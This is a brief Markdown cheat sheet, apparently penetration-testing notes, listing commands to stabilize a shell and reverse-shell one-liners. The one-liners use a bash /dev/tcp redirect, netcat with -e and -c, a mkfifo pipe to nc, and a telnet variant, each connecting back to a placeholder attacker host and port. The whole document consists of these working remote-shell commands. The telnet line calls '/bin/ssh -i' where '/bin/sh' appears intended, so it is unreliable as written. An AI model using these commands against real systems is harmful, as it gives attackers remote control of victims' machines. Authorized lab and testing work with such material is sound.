# Shells

## Stabilizing shell

```text
SHELL=/bin/bash script -q /dev/null
[Ctrl + Z]
stty raw -echo
fg
reset
xterm
```

## Reverse shells

### Bash

```text
bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'
```

### Netcat

```text
nc -e /bin/sh <LHOST> <LPORT>
nc -c /bin/sh <LHOST> <LPORT>
rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/y
```

### Telnet

```text
rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/ssh -i 2>&1|telnet <LHOST> <LPORT> >/tmp/y
```
